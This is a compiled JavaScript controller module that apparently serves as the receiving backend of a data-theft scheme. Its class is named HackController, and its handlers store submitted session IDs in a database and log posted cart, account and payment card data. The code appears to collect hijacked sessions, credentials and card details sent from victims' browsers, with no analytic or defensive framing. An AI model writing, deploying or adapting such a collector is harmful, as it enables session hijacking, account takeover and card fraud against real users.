"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
exports.HackController = void 0;
var session_schema_1 = require("../config/database/schema/session.schema");
var HackController = /** @class */ (function () {
    function HackController() {
    }
    HackController.postSessionId = function (req, res, next) {
        var session = new session_schema_1.SessionModel(req.body);
        session
            .save()
            .then(function () {
            console.log("Session luu thanh cong!");
        })
            .catch(function () { });
    };
    HackController.postCart = function (req, res) {
        console.log(req.body);
    };
    HackController.postCartSent = function (req, res) {
        console.log(req.body);
    };
    HackController.postAccount = function (req, res) {
        console.log(req.body);
    };
    HackController.postCard = function (req, res) {
        console.log(req.body);
    };
    return HackController;
}());
exports.HackController = HackController;
